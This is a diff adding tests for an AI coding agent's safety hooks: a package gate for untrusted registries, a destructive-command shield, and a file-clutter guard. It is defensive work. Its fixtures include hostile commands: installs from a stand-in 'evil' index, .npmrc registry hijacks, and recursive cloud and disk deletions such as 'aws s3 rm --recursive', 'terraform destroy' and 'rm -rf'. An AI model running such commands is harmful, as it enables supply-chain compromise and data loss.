+test('3.49.12b: package gate: a home-folder path (~/x, ~\\x) stays local in a command and in package.json', async () => {
+  const added = await loadAdded();
+  for (const p of ['~/x', '~\\x']) {
+    assert.deepEqual(findPackages(`npm i ${p}`), [], `npm i ${p}`);
+    assert.deepEqual(added('package.json', '{}', JSON.stringify({ dependencies: { zlocal: p } })), [], `package.json ${p}`);
+  }
+});
+
+test('3.49.12b: ATTACK package gate: pip index and editable spellings (-iURL, -fURL, --editable=, -eURL, quoted --index-url=, flags before install, -r URL) are unverifiable; requests is still checked', () => {
+  const withRequests = ['pip install -ihttps://evil/simple requests', 'pip install -fhttps://x requests', 'pip install "--index-url=https://evil" requests',
+    'pip --index-url https://evil install requests', 'python -m pip --index-url https://evil install requests'];
+  const missed = [...withRequests, 'pip install --editable=git+https://x/y', 'pip install -egit+https://x/y', 'pip install -r https://evil/req.txt']
+    .filter((c) => !unvOf(c).some((p) => p.eco === 'pypi')).map((c) => `${c} -> ${JSON.stringify(findPackages(c))}`);
+  assert.deepEqual(missed, []);
+  for (const c of withRequests) assert.deepEqual(regIds(c), ['pypi:requests'], `${c}: requests is still a registry entry`);
+  assert.deepEqual(regIds('pip --proxy http://x install requests'), ['pypi:requests'], 'a flag value before install is not the subcommand');
+  for (const c of ['pip install -r requirements.txt', 'pip install -e .']) assert.deepEqual(findPackages(c), [], c);
+});
+
+test('3.49.12b: ATTACK package gate: requirements lines -iURL, -eURL and -r URL are unverifiable', async () => {
+  const added = await loadAdded();
+  for (const line of ['-ihttps://evil', '-egit+https://x/y', '-r https://evil/req.txt']) {
+    const s = splitAdded(added('requirements.txt', 'requests\n', `requests\n${line}\n`), line);
+    assert.notEqual(s.unv.length, 0, `${line}: unverifiable, got ${JSON.stringify(s)}`);
+    assert.deepEqual(s.unv.filter((p) => p.eco !== 'pypi'), [], `${line}: eco pypi`);
+  }
+});
+
+test('3.49.12b: ATTACK package gate: a registry set elsewhere in the command (export, $env:, set, --@scope:registry, --userconfig, ci/install/sync, config set, .npmrc write) is unverifiable', () => {
+  const cases = [
+    ['export PIP_INDEX_URL=https://evil; pip install requests', 'pypi'], ['$env:PIP_INDEX_URL="https://evil"; pip install requests', 'pypi'],
+    ['set PIP_INDEX_URL=https://evil && pip install requests', 'pypi'], ['export npm_config_registry=http://x; npm i lodash', 'npm'],
+    ['npm i --@evil:registry=http://x @evil/pkg', 'npm'], ['npm i --userconfig ./evil.npmrc lodash', 'npm'], ['npm ci --registry=http://x', 'npm'],
+    ['yarn install --registry http://x', 'npm'], ['uv sync --index-url http://x', 'pypi'], ['npm config set registry http://evil', 'npm'],
+    ['pnpm config set registry http://evil', 'npm'], ['pip config set global.index-url http://evil', 'pypi'], ['echo registry=http://evil >> .npmrc', 'npm'],
+  ];
+  assert.deepEqual(cases.filter(([c, eco]) => !unvOf(c).some((p) => p.eco === eco)).map(([c]) => `${c} -> ${JSON.stringify(findPackages(c))}`), []);
+});
+
+test('3.49.12b: package gate: another command\'s -f and npm\'s own -f (force) are not a custom index', () => {
+  for (const c of ['rm -f x && npm i lodash', 'npm i -f lodash']) {
+    assert.deepEqual(unvOf(c), [], c);
+    assert.deepEqual(regIds(c), ['npm:lodash'], c);
+  }
+});
+
+test('3.49.12b: ATTACK package gate: pyproject [tool.uv.sources] git, [build-system] requires, pdm/hatch dependencies, uv/poetry index urls are read', async () => {
+  const added = await loadAdded();
+  const declared = '[project]\nname = "app"\ndependencies = ["foo"]\n';
+  const src = splitAdded(added('pyproject.toml', declared, `${declared}\n[tool.uv.sources]\nfoo = { git = "https://evil" }\n`), 'uv sources');
+  assert.deepEqual(src.reg, [], 'foo was declared before');
+  assert.notEqual(src.unv.length, 0, 'a new git source for a declared name is unverifiable');
+  for (const [toml, label] of [['[build-system]\nrequires = ["evil"]\n', 'build-system'], ['[tool.pdm.dev-dependencies]\ntest = ["evil"]\n', 'pdm dev'],
+    ['[tool.hatch.envs.default]\ndependencies = ["evil"]\n', 'hatch env']])
+    assert.deepEqual(splitAdded(added('pyproject.toml', '', toml), label), { reg: ['pypi:evil'], unv: [] }, label);
+  for (const [toml, label] of [['[[tool.uv.index]]\nname = "x"\nurl = "https://evil/simple"\n', 'uv index'],
+    ['[[tool.poetry.source]]\nname = "x"\nurl = "https://evil/simple"\n', 'poetry source']]) {
+    const s = splitAdded(added('pyproject.toml', '', toml), label);
+    assert.deepEqual(s.reg, [], `${label}: the index name is not a package`);
+    assert.notEqual(s.unv.length, 0, `${label}: unverifiable`);
+  }
+});
+
+test('3.49.12b: ATTACK package gate: pyproject poetry sub-table headers, dotted keys, top-level dotted keys and quoted headers are read', async () => {
+  const added = await loadAdded();
+  assert.deepEqual(splitAdded(added('pyproject.toml', '', '[tool.poetry.dependencies.evil]\nversion = "^1"\n'), 'sub-table'), { reg: ['pypi:evil'], unv: [] });
+  const git = splitAdded(added('pyproject.toml', '', '[tool.poetry.dependencies.evil]\ngit = "https://x/y.git"\n'), 'sub-table git');
+  assert.deepEqual(git.reg, [], 'sub-table git: not a registry name');
+  assert.notEqual(git.unv.length, 0, 'sub-table git: unverifiable');
+  for (const [toml, label] of [['[project]\nname = "app"\noptional-dependencies.dev = ["evil"]\n', 'dotted key in [project]'],
+    ['project.dependencies = ["evil"]\n', 'top-level dotted key'], ['["project"]\ndependencies = ["evil"]\n', 'quoted header']])
+    assert.deepEqual(splitAdded(added('pyproject.toml', '', toml), label), { reg: ['pypi:evil'], unv: [] }, label);
+});
+
+test('3.49.12b: ATTACK package gate: package.json catalog: and patch: specs add a registry entry for the name', async () => {
+  const added = await loadAdded();
+  for (const spec of ['catalog:', 'patch:foo@npm%3A1.0.0#./p.patch'])
+    assert.deepEqual(splitAdded(added('package.json', '{}', JSON.stringify({ dependencies: { foo: spec } })), spec), { reg: ['npm:foo'], unv: [] }, spec);
+});
+
+test('3.49.12b: package gate: cargo flags before install and value flags are not package names; a # comment is not a package', () => {
+  for (const c of ['cargo --locked install x', 'cargo -q install x', 'cargo install -j 4 x'])
+    assert.deepEqual(unvOf(c).map((p) => p.name || p.spec), ['x'], c);
+  assert.deepEqual(findPackages('pip install requests # pin later').map((p) => `${p.eco}:${p.name}`), ['pypi:requests']);
+});
+
+// Clutter map with a test.* deny pattern: the arrow of a JS function (=>) or text in quotes must not read as a redirect
+const CLUTTER_MAP_TEST = JSON.stringify({ allow: ['src/**', 'a.ts', '*.md', 'sandbox/**'], deny: ['**/*.bak', '**/*-old.*', '**/*.old.*', '**/test.*'] });
+
+test('3.49.12b: ATTACK structure guard: quoted text, a commit message, an arrow function and a heredoc body are not files the shell creates', async () => {
+  const clutterIssue = await loadClutter();
+  const root = clutterProject(CLUTTER_MAP_TEST);
+  try {
+    const free = ['node -e "setTimeout(() => test.run())"', 'git commit -m "stop writing a -> a.bak copies"', "echo 'a => test.js'",
+      "cat <<'EOF'\nconst f = () => test.skip();\nEOF"];
+    assert.deepEqual(free.map((c) => [c, clutterIssue(c, root, root)]).filter(([, s]) => s !== null).map(([c, s]) => `${JSON.stringify(c)} -> ${JSON.stringify(s)}`), []);
+  } finally { fs.rmSync(root, { recursive: true, force: true }); }
+});
+
+test('3.49.12b: ATTACK structure guard: clutter created behind VAR=, sudo, ( ), { }, a # comment, >| or Copy-Item -Destination is asked', async () => {
+  const clutterIssue = await loadClutter();
+  const root = clutterProject();
+  try {
+    const asked = ['cp a.ts a.bak', 'FOO=1 cp a.ts a.bak', 'sudo cp a.ts a.bak', '(cp a.ts a.bak)', '{ cp a.ts a.bak; }', 'cp a.ts a.bak # c',
+      'echo x >| a.bak', 'Copy-Item -Destination a.bak -Path a.ts'];
+    assert.deepEqual(asked.map((c) => [c, clutterIssue(c, root, root)]).filter(([, s]) => s?.decision !== 'ask').map(([c, s]) => `${c} -> ${JSON.stringify(s)}`), []);
+  } finally { fs.rmSync(root, { recursive: true, force: true }); }
+});
+
+test('3.49.12b: ATTACK shield: evaluate() on 100 KB of a repeated deploy/delete word returns in under 1 s each (no regex blow-up)', () => {
+  const mod = new URL('../../.claude/hooks/destructive-guard.mjs', import.meta.url).href;
+  const slow = [];
+  for (const unit of ['vc ', 'vercel@1 ', 'git branch -d ', 'kubectl ', 'aws s3 rm ', 'docker system prune ']) {
+    const code = `const { evaluate } = await import(${JSON.stringify(mod)});
+const s = ${JSON.stringify(unit)}.repeat(Math.ceil(100000 / ${unit.length}));
+const t = Date.now(); evaluate(s); process.stdout.write(String(Date.now() - t));`;
+    const r = spawnSync(process.execPath, ['--input-type=module', '-e', code], { encoding: 'utf8', timeout: 10000 });
+    if (r.error || r.status !== 0) slow.push(`${JSON.stringify(unit)}: did not finish in 10000 ms (${r.error?.code ?? r.stderr.slice(0, 200)})`);
+    else if (Number(r.stdout) >= 1000) slow.push(`${JSON.stringify(unit)}: ${r.stdout} ms`);
+  }
+  assert.deepEqual(slow, []);
+});
+
+test('3.49.12b: ATTACK shield: more cloud deletions (aws --profile, dynamodb, ec2 terminate, gcloud compute, gsutil/gcloud storage rm -r, supabase/netlify/fly volumes) are denied', () => {
+  assert.deepEqual(shieldMisses(evalDecision, ['aws --profile x s3 rm s3://b --recursive', 'aws dynamodb delete-table --table-name t',
+    'aws ec2 terminate-instances --instance-ids i-1', 'gcloud compute instances delete x', 'gsutil rm -r gs://b', 'gcloud storage rm -r gs://b',
+    'supabase projects delete x', 'netlify sites:delete', 'fly volumes destroy v'], ['deny']), []);
+});
+
+test('3.49.12b: ATTACK shield: publish with workspace flags or --dry-run=false, git -C branch -D main, refs/heads/main and gh release delete are asked', () => {
+  assert.deepEqual(shieldMisses(evalDecision, ['pnpm -r publish', 'pnpm --filter x publish', 'npm -w x publish', 'npm --workspaces publish',
+    'yarn --cwd x publish', 'npm publish --dry-run=false', 'git -C . branch -D main', 'git branch -D refs/heads/main', 'gh release delete v1'], ['ask']), []);
+});
+
+test('3.49.12b: shield: a file named delete.yaml, a pod named delete-me and find -exec rm on vercel.json are not asked', () => {
+  assert.deepEqual(shieldMisses(evalDecision, ['kubectl apply -f delete.yaml', 'kubectl get pod delete-me', 'find . -name vercel.json -exec rm {} \\;'], [null]), []);
+});
+
+// ---------- 3.49.12c: re-audit of the 3.49.12 code ----------
+
+const allIds = (c) => findPackages(c).map((p) => `${p.eco}:${p.name}`);
+
+test('3.49.12c: ATTACK package gate: a # inside quotes does not cut the command; a real # comment still does', () => {
+  for (const [c, want] of [['npm i --prefix "a #b" evil', 'npm:evil'], ['npm i --save-prefix=" #" evil', 'npm:evil'],
+    ['pip install --target " #" evil', 'pypi:evil'], ["pip install --target ' #' evil", 'pypi:evil']])
+    assert.deepEqual(regIds(c), [want], c);
+  assert.deepEqual(allIds('pip install requests # pin later'), ['pypi:requests']);
+});
+
+test('3.49.12c: ATTACK package gate: registry config set by command (npm set/c set/--location/--global, pnpm, yarn -H, pip config, poetry source/config, .npmrc/.pypirc/poetry.toml/bunfig.toml writes, --regist=, PIP_CONFIG_FILE) is unverifiable', () => {
+  const cases = ['npm set registry http://evil', 'npm c set registry http://evil', 'npm config set --location=global registry http://evil',
+    'npm config set --global registry http://evil', 'npm config --location=global set registry http://evil', 'pnpm config set --location project registry http://evil',
+    'yarn config set -H npmRegistryServer http://evil', 'pip config set --global global.index-url http://evil', 'pip config --user set global.index-url http://evil',
+    'poetry source add evil http://evil', 'poetry config repositories.evil http://evil', 'cp evil.npmrc .npmrc', 'Set-Content .npmrc "registry=x"',
+    'Out-File -FilePath .npmrc', 'echo x > .pypirc', 'echo x > poetry.toml', 'echo x > bunfig.toml', 'npm i --regist=http://x lodash',
+    'PIP_CONFIG_FILE=./evil.conf pip install requests'];
+  assert.deepEqual(cases.filter((c) => unvOf(c).length === 0).map((c) => `${c} -> ${JSON.stringify(findPackages(c))}`), []);
+});
+
+test('3.49.12c: package gate: reading the registry config or package info is not unverifiable', () => {
+  for (const c of ['npm config get registry', 'npm view lodash version']) assert.deepEqual(unvOf(c), [], c);
+});
+
+test('3.49.12c: ATTACK package gate hook: a file-tool Write of a registry config file (.npmrc, .yarnrc.yml, pip.conf, pip.ini, uv.toml, poetry.toml, .pypirc, bunfig.toml) is asked, whatever its content', () => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'pkg-34912c-'));
+  try {
+    const missed = [];
+    for (const f of ['.npmrc', '.yarnrc.yml', 'pip.conf', 'pip.ini', 'uv.toml', 'poetry.toml', '.pypirc', 'bunfig.toml']) {
+      const r = spawnSync(process.execPath, ['--import', `data:text/javascript,${encodeURIComponent(FETCH_404)}`, path.join(HOOKS, 'package-gate.mjs')], {
+        input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Write', cwd: root, tool_input: { file_path: path.join(root, f), content: '# settings\n' } }),
+        encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: root }, timeout: 10000,
+      });
+      const d = r.status === 0 && r.stdout.trim() ? JSON.parse(r.stdout).hookSpecificOutput.permissionDecision : null;
+      if (d !== 'ask') missed.push(`${f} -> ${d} (status ${r.status}${r.error ? `, ${r.error.code}` : ''})`);
+    }
+    assert.deepEqual(missed, []);
+  } finally { fs.rmSync(root, { recursive: true, force: true }); }
+});
+
+test('3.49.12c: package gate: --trusted-host and poetry --source values are not package names', () => {
+  assert.deepEqual(allIds('pip install --trusted-host x requests'), ['pypi:requests']);
+  assert.deepEqual(allIds('poetry add --source evil foo'), ['pypi:foo']);
+});
+
+// evaluate() on a long command in a child process: { ms, decision, reason }
+const evalLong = (command) => {
+  const mod = new URL('../../.claude/hooks/destructive-guard.mjs', import.meta.url).href;
+  const code = `const { evaluate } = await import(${JSON.stringify(mod)});
+const c = ${JSON.stringify(command)}; const t = Date.now(); const s = evaluate(c);
+process.stdout.write(JSON.stringify({ ms: Date.now() - t, decision: s?.decision ?? null, reason: s?.reason ?? '' }));`;
+  const r = spawnSync(process.execPath, ['--input-type=module', '-e', code], { encoding: 'utf8', timeout: 10000 });
+  assert.equal(r.error, undefined, `evaluate did not finish in 10000 ms: ${r.error && r.error.code}`);
+  assert.equal(r.status, 0, r.stderr.slice(0, 300));
+  return JSON.parse(r.stdout);
+};
+
+test('3.49.12c: ATTACK shield: a command over MAX_COMMAND keeps the deny of a short line; otherwise it is asked, naming the guarded word; each in under 1 s', async () => {
+  const { MAX_COMMAND } = await import('../../.claude/hooks/destructive-guard.mjs');
+  assert.equal(MAX_COMMAND, 10000, 'destructive-guard.mjs exports MAX_COMMAND = 10000');
+  const denied = evalLong(`terraform destroy\n# ${'x'.repeat(10001)}`);
+  assert.equal(denied.decision, 'deny', 'a short line with terraform destroy');
+  assert.ok(denied.ms < 1000, `deny took ${denied.ms} ms`);
+  const plain = evalLong(`echo hi\n${'x'.repeat(10001)}`);
+  assert.equal(plain.decision, 'ask', 'long and harmless: asked');
+  assert.ok(plain.ms < 1000, `ask took ${plain.ms} ms`);
+  const oneLine = evalLong(`terraform destroy${' '.repeat(10001)}`);
+  assert.equal(oneLine.decision, 'ask', 'one long line: asked');
+  assert.match(oneLine.reason, /destroy/, `the reason names the guarded word: ${oneLine.reason}`);
+  assert.ok(oneLine.ms < 1000, `one line took ${oneLine.ms} ms`);
+});
+
+test('3.49.12c: ATTACK shield hook: on Codex and Antigravity a long command with a short rm -rf line is denied', () => {
+  const root = shieldProject();
+  try {
+    const c = `rm -rf x\n${'x'.repeat(10001)}`;
+    for (const tool of ['codex', 'antigravity']) assert.equal(shieldOn(tool, root, c), 'deny', tool);
+  } finally { fs.rmSync(root, { recursive: true, force: true }); }
+});
+
+test('3.49.12c: ATTACK shield: options between the service and the subcommand do not hide a cloud deletion; s3api delete-bucket, gcloud projects delete and az resource delete are denied', () => {
+  assert.deepEqual(shieldMisses(evalDecision, ['aws s3 --region r rm s3://b --recursive', 'gcloud sql --project=p instances delete x', 'heroku -a x apps:destroy',
+    'fly --app x apps destroy', 'flyctl -a x apps destroy x', 'gh --repo x repo delete', 'aws s3api delete-bucket --bucket b', 'gcloud projects delete p',
+    'az resource delete --ids x'], ['deny']), []);
+});
+
+test('3.49.12c: ATTACK shield: options before the subcommand, .exe/.cmd tool names, --no-dry-run and other publish/deprecate commands are asked', () => {
+  assert.deepEqual(shieldMisses(evalDecision, ['gh -R x/y release create v1', 'docker --context x system prune -a', 'docker -H tcp://x system prune -a',
+    'helm -n ns uninstall r', 'helm -n ns delete r', 'helm --kube-context x uninstall r', 'railway --service x down', 'kubectl.exe delete pod x',
+    'vercel.cmd rm x', 'npm publish --dry-run --no-dry-run', 'cargo publish', 'twine upload dist/*', 'lerna publish', 'changeset publish',
+    'npm deprecate x "msg"', 'npm dist-tag add x@1 latest'], ['ask']), []);
+});
+
+test('3.49.12c: shield: list and status commands with options before the subcommand stay free', () => {
+  assert.deepEqual(shieldMisses(evalDecision, ['helm -n ns list', 'docker --context x ps', 'gh --repo x issue list'], [null]), []);
+});
+
+test('3.49.12c: ATTACK structure guard: quoted targets and the first line of a heredoc are seen (asked); earlier free cases stay free', async () => {
+  const clutterIssue = await loadClutter();
+  const root = clutterProject(CLUTTER_MAP_TEST);
+  try {
+    const asked = ['echo x > "a.bak"', "echo x > 'a.bak'", 'cp "a b.ts" "c d.bak"', 'Set-Content -Path "a.bak" -Value x', 'cat <<EOF > a.bak\nhi\nEOF', 'cat <<EOF | tee a.bak\nhi\nEOF'];
+    assert.deepEqual(asked.map((c) => [c, clutterIssue(c, root, root)]).filter(([, s]) => s?.decision !== 'ask').map(([c, s]) => `${JSON.stringify(c)} -> ${JSON.stringify(s)}`), []);
+    const free = ['node -e "setTimeout(() => test.run())"', 'git commit -m "stop writing a -> a.bak copies"', "echo 'a => test.js'", "cat <<'EOF'\nconst f = () => test.skip();\nEOF"];
+    assert.deepEqual(free.map((c) => [c, clutterIssue(c, root, root)]).filter(([, s]) => s !== null).map(([c, s]) => `${JSON.stringify(c)} -> ${JSON.stringify(s)}`), []);
+  } finally { fs.rmSync(root, { recursive: true, force: true }); }
+});
+
+// ---------- 3.49.12d: last audit round ----------
+
+test('3.49.12d: ATTACK package gate: a backslash-escaped space does not start a # comment; a real comment still ends the command', () => {
+  assert.ok(regIds('npm i --prefix a\\ #b evil').includes('npm:evil'), `npm: ${JSON.stringify(findPackages('npm i --prefix a\\ #b evil'))}`);
+  assert.ok(regIds('pip install --target a\\ #b evil').includes('pypi:evil'), `pip: ${JSON.stringify(findPackages('pip install --target a\\ #b evil'))}`);
+  assert.deepEqual(allIds('npm i lodash # c'), ['npm:lodash']);
+});
+
+test('3.49.12d: ATTACK shield: evaluate() on 999 repeated "aws s3 rm " returns in under 1 s; options around s3 still deny a recursive rm', () => {
+  const r = evalLong('aws s3 rm '.repeat(999));
+  assert.ok(r.ms < 1000, `took ${r.ms} ms`);
+  assert.equal(evalDecision('aws --profile x s3 --region r rm s3://b --recursive'), 'deny');
+});
+
+test('3.49.12d: ATTACK shield hook: a ~95 KB command of 100-character "aws s3 rm" lines finishes in under 2 s', () => {
+  const root = shieldProject();
+  try {
+    const command = Array.from({ length: 950 }, () => 'aws s3 rm '.repeat(10)).join('\n');
+    assert.ok(command.length > 94000 && command.length < 96000, `length ${command.length}`);
+    const start = Date.now();
+    const r = spawnSync(process.execPath, [path.join(HOOKS, 'destructive-guard.mjs')], {
+      input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, cwd: root }),
+      encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: root }, timeout: 10000,
+    });
+    const ms = Date.now() - start;
+    assert.equal(r.error, undefined, `hook did not finish in 10000 ms: ${r.error && r.error.code}`);
+    assert.equal(r.status, 0, r.stderr.slice(0, 300));
+    assert.ok(ms < 2000, `took ${ms} ms`);
+  } finally { fs.rmSync(root, { recursive: true, force: true }); }
+});
+
+test('3.49.12d: ATTACK structure guard: quoted names with shell characters ( ), =, ;, # are targets (asked); > inside quotes is not a redirect', async () => {
+  const clutterIssue = await loadClutter();
+  const root = clutterProject(JSON.stringify({ allow: ['src/**', 'a.ts', '*.md', 'sandbox/**'], deny: ['**/*.bak', '**/*-old.*', '**/*.old.*', '**/test.*', '**/* (?).*'] }));
+  try {
+    const asked = ['cp a.ts "a (1).ts"', 'Copy-Item "a.ts" "a (1).ts"', 'echo x > "a=b.bak"', 'echo x > "a;b.bak"', 'echo x > "a#b.bak"'];
+    assert.deepEqual(asked.map((c) => [c, clutterIssue(c, root, root)]).filter(([, s]) => s?.decision !== 'ask').map(([c, s]) => `${c} -> ${JSON.stringify(s)}`), []);
+    const free = ['echo "a > b.bak"', 'node -e "if(a>b.bak)"', 'git commit -m "stop writing a -> a.bak copies"'];
+    assert.deepEqual(free.map((c) => [c, clutterIssue(c, root, root)]).filter(([, s]) => s !== null).map(([c, s]) => `${c} -> ${JSON.stringify(s)}`), []);
+  } finally { fs.rmSync(root, { recursive: true, force: true }); }
 });
